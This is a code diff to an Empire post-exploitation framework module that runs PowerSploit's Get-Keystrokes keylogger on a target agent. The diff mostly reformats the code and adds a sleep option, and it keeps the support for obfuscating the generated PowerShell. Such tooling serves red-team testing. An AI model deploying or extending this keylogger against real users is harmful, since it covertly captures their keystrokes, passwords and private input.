@@ -15,24 +15,25 @@ class Module(object):
 
             'Author': ['@obscuresec', '@mattifestation', '@harmj0y'],
 
-            'Description': ('Logs keys pressed, time and the active window (when changed) to the keystrokes.txt file. This file is located in the agents downloads directory Empire/downloads/<AgentName>/keystrokes.txt.'),
+            'Description': (
+                'Logs keys pressed, time and the active window (when changed) to the keystrokes.txt file. This file is located in the agents downloads directory Empire/downloads/<AgentName>/keystrokes.txt.'),
 
             'Software': '',
 
             'Techniques': ['T1056'],
 
-            'Background' : True,
+            'Background': True,
 
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : False,
+            'OutputExtension': None,
 
-            'OpsecSafe' : True,
+            'NeedsAdmin': False,
 
-            'Language' : 'powershell',
+            'OpsecSafe': True,
 
-            'MinLanguageVersion' : '2',
-            
+            'Language': 'powershell',
+
+            'MinLanguageVersion': '2',
+
             'Comments': [
                 'https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1'
             ]
@@ -42,10 +43,15 @@ class Module(object):
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
+            'Agent': {
+                'Description': 'Agent to run module on.',
+                'Required': True,
+                'Value': ''
+            },
+            'Sleep': {
+                'Description': 'Sleep time [ms] between key presses. Shorter times may increase CPU usage on the target.',
+                'Required': False,
+                'Value': '1'
             }
         }
 
@@ -58,7 +64,6 @@ class Module(object):
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
-
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
@@ -78,7 +83,7 @@ class Module(object):
 
         scriptEnd = "Get-Keystrokes "
 
-        for option,values in self.options.items():
+        for option, values in self.options.items():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
                     if values['Value'].lower() == "true":
@@ -88,7 +93,8 @@ class Module(object):
                         scriptEnd += " -" + str(option) + " " + str(values['Value'])
 
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd,
+                                          obfuscationCommand=obfuscationCommand)
         script += scriptEnd
         script = helpers.keyword_obfuscation(script)
 
